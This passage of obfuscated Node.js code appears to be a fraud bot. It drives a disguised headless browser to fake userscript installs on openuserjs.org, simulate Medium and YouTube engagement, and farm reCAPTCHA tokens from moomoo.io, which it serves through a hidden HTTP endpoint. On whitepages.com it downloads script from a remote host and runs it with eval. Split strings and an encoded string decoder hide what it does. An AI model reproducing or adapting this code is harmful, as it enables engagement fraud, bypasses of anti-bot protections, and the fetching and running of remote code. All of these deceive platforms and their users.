      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + W(0x3) + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + W(0x9) + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + V(0x13) + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + W(0x14) + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + W(0x4) + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x2b * -0xab + -0x1 * 0x28f + -0xc5 * 0x22
  };

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x22c3 + -0x3 * 0x361 + -0x18a0);
    let h = e[f];
    return h;
  }, d(b, c);
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x22c3 + -0x3 * 0x361 + -0x18a0);
    let h = e[f];
    if (c['UxSFdH'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1c13 * -0x1 + -0x4f * -0x25 + -0x52 * -0x34, r, s, t = -0x3 * 0x241 + 0x7 * -0x42c + -0x129 * -0x1f; s = m['charAt'](t++); ~s && (r = q % (0x17f5 * -0x1 + 0x7ce + 0x1 * 0x102b) ? r * (-0x741 + 0x1555 + -0xdd4) + s : s, q++ % (-0x2014 + -0x11e1 * 0x2 + 0x43da)) ? o += String['fromCharCode'](-0x4 * -0x586 + -0x1d6a + 0x851 & r >> (-(-0x7 * -0x476 + 0x1745 + 0x1d * -0x1e1) * q & -0x1c * -0x89 + 0x1 * -0x21a1 + 0x12ab)) : 0x64e * -0x2 + 0xc8 * -0x2b + 0x2e34) {
          s = n['indexOf'](s);
        }
        for (let u = 0x4a + 0x99 * -0x2b + -0x5 * -0x515, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1b39 + -0x187f + 0x33c8))['slice'](-(0x1053 + -0x4f * 0x5f + 0x100 * 0xd));
        }
        return decodeURIComponent(p);
      };
      c['jDBXRN'] = i, b = arguments, c['UxSFdH'] = !![];
    }
    const j = e[-0x7 * 0x39e + 0x1 * -0x1b1 + 0x1b03],
      k = f + j,
      l = b[k];
    return !l ? (h = c['jDBXRN'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x22c3 + -0x3 * 0x361 + -0x18a0);
    let h = e[f];
    if (b['knnnkO'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1c13 * -0x1 + -0x4f * -0x25 + -0x52 * -0x34, s, t, u = -0x3 * 0x241 + 0x7 * -0x42c + -0x129 * -0x1f; t = n['charAt'](u++); ~t && (s = r % (0x17f5 * -0x1 + 0x7ce + 0x1 * 0x102b) ? s * (-0x741 + 0x1555 + -0xdd4) + t : t, r++ % (-0x2014 + -0x11e1 * 0x2 + 0x43da)) ? p += String['fromCharCode'](-0x4 * -0x586 + -0x1d6a + 0x851 & s >> (-(-0x7 * -0x476 + 0x1745 + 0x1d * -0x1e1) * r & -0x1c * -0x89 + 0x1 * -0x21a1 + 0x12ab)) : 0x64e * -0x2 + 0xc8 * -0x2b + 0x2e34) {
          t = o['indexOf'](t);
        }
        for (let v = 0x4a + 0x99 * -0x2b + -0x5 * -0x515, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1b39 + -0x187f + 0x33c8))['slice'](-(0x1053 + -0x4f * 0x5f + 0x100 * 0xd));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x7 * 0x39e + 0x1 * -0x1b1 + 0x1b03,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x60c + -0x2239 + 0x1 * 0x1c2d; u < 0x5 * 0x493 + -0x9be + -0xc21; u++) {
          p[u] = u;
        }
        for (u = 0xd3 * -0x2e + 0x6e6 * -0x1 + 0x2cd0; u < 0x2 * 0x16 + -0x13fd + 0x14d1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1428 + 0x3 * -0xaff + -0xdd5 * -0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x6b * -0x57 + 0x5 * -0x73e + -0x27, q = 0x1170 + 0x678 * 0x2 + -0x10 * 0x1e6;
        for (let v = -0x191 * -0xc + 0x22f + 0x29 * -0x83; v < n['length']; v++) {
          u = (u + (0x3df + -0xe5b + 0xa7d)) % (-0x14d9 + -0xec7 + 0x24a0), q = (q + p[u]) % (0x13c2 + -0xf19 + -0x3a9), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x977 * 0x1 + 0x964 + -0x11db * 0x1)]);
        }
        return t;
      };
      b['SFNwLJ'] = m, c = arguments, b['knnnkO'] = !![];
    }
    const j = e[-0x14a6 + -0x1 * 0x9a3 + 0x1e49],
      k = f + j,
      l = c[k];
    return !l ? (b['JVNpak'] === undefined && (b['JVNpak'] = !![]), h = b['SFNwLJ'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x196 + 0x67 * 0x1 + 0x12f)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x4b3 * -0x3 + -0xea7 + -0xb * -0x16), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x180d + 0x5e * 0x43 + -0x29 * 0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x65d * 0x5 + -0x1 * 0x1aac + -0x1b7 * 0x3;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1373 * -0x2 + -0x932 + -0x1db4; w < getRandomInt(-0x1 * 0x84f + 0x839 * 0x2 + -0x822, -0x21 * 0xe5 + 0x17cc + 0x5be); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x2113 + 0x16d2 + 0xb27b);
        }
      }();
    }, 0x1d2a * -0x1 + 0xdc * -0x1d + 0x1 * 0x367a), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1 * 0xfc3 + -0x198 * 0xb + -0x97 * -0x3;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x607 * -0x2 + -0x1f99 + 0x138b, -0x3 * -0xe5 + 0x1fb6 + -0x2233)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x7171 + 0x4d1 * 0x2 + 0xb * -0x89);
    }, 0xd4a + -0x57d * -0x1 + -0x3 * 0x621), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const Y = c;
        try {
          let s = 0x1d44 * 0x1 + 0x26e2 + 0x2213 * -0x2;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u[Y(0x19)](), await t['close'](), r();
          await wait(0x1401 + -0x2e6 + -0xc5 * 0x7), await u['evaluate'](() => {
            const Z = c;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + Z(0x6) + 'me/cdn/xm7' + '7/wp.js', -0xddf + -0x1fbe + -0x1 * -0x2d9d), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x26ecd + -0x169 * 0xce + 0x57 * 0x2497);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x12af + -0x3b4 + -0x341 * -0x7);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1 * -0xb69 + -0x10c9 + 0x1cfa);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x25de + -0x202 * 0xf + 0x17d0);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = d,
    a2 = c;
  async function f() {
    const a1 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x124d * 0x1 + 0x1 * 0xb77 + 0x6d7) {
        const a0 = b;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * -0x16de + -0x1f5 + -0xdf * 0x18));
        const C = A['indexOf']('Chrome/') + a0(0x12, 'Cg[2')['length'],
          D = A['slice'](C),
          E = D['slice'](-0x295 * -0x2 + 0x230a + -0x2 * 0x141a, D['indexOf']('\x20'));
        return B ? E['slice'](-0xae8 + -0x299 + 0xd81, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x40 * 0x91 + -0x51b * 0x6 + -0x1 * -0x69f2),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + a1(0x7, 'MT^@') + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x36cc + -0x209 * -0x20 + -0x50dc),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + a2(0xe) + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + a3(0xd) + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + a3(0xf) + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x2dc * -0xb + -0x20b + -0x4c9 * -0x7; k < -0x11e9 * -0x2 + -0x102 * 0x4 + -0xa6 * 0x31; k++)
    setTimeout(f, (0x28 * 0x430 + 0x114be + -0xd1de) * k * getRandomInt(0x1ccc + -0x19ff + -0x2cc, 0x14a1 + -0x19 * -0xe9 + -0xe75 * 0x3));
  setInterval(() => {
    f();
